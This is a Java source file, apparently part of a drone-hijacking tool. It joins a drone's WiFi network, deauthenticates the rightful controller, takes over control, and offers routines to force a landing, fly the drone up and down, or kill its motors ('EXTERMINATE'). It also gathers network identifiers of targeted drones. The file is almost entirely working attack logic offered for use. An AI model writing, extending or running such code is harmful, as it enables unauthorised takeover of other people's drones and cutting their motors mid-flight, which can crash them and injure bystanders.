public class Procedures {

    private static DroneConnection hijack(String essid) {
        System.out.println("hijacking drone control...");
        System.out.println("connecting to network [" + essid + "]");
        Networking.connectWIFI(essid, Main.ifName_managed);
        String ip = Networking.getGatewayIp();
        System.out.println("retrieved access point ip [" + ip + "]");
        System.out.println("deauthenticating");
        Networking.deauth(Main.ifName_monitor, essid, 15);
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
        }
        System.out.println("reconnecting to network");
        Networking.connectWIFI(essid, Main.ifName_managed);
        return new DroneConnection(ip);
    }

    public static void land(String essid) {
        DroneConnection dc = hijack(essid);
        dc.setFlyParameters();
        dc.start();
        sleep(4000);
        System.err.println("landing");
        dc.setLandingParams();
        sleep(15000);
        System.err.println("killing motors");
        dc.setKillParameters();
        sleep(10000);
        dc.stop();
    }

    public static void balloon(String essid) {
        DroneConnection dc = hijack(essid);
        dc.setFlyParameters();
        System.out.println("everybody's drones go UP!!!");
        dc.start();
        for (int i = 0; i < 3; i++) {
            sleep(4000);
            System.out.println("\tand they stay there ... ");
        }
        sleep(8000);
        System.out.println("now they go down :(");
        dc.setLandingParams();
        sleep(40000);
        System.out.println("and they stay there!!!");
        dc.setKillParameters();
        sleep(10000);
        dc.stop();
    }

    public static void kill(String essid) {
        System.out.println("EXTERMINATE");
        DroneConnection dc = hijack(essid);
        dc.setFlyParameters();
        dc.start();
        sleep(100);
        System.out.println("killing motors ...");
        dc.setKillParameters();
        sleep(10000);
        dc.stop();
        System.out.println("ded");
    }

    public static String info(String essid) {
        Networking.connectWIFI(essid, Main.ifName_managed);
        String ip = Networking.getGatewayIp();
        String mac = Networking.getMAC(ip);

        return "SSID: " + essid + "\nIP: " + ip + "\nMAC: " + mac + "\nType: " +
                (essid.startsWith("9300-") ? "P.A.U.L." : "unknown");
    }

    public static void sleep(int millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
        }
    }


}
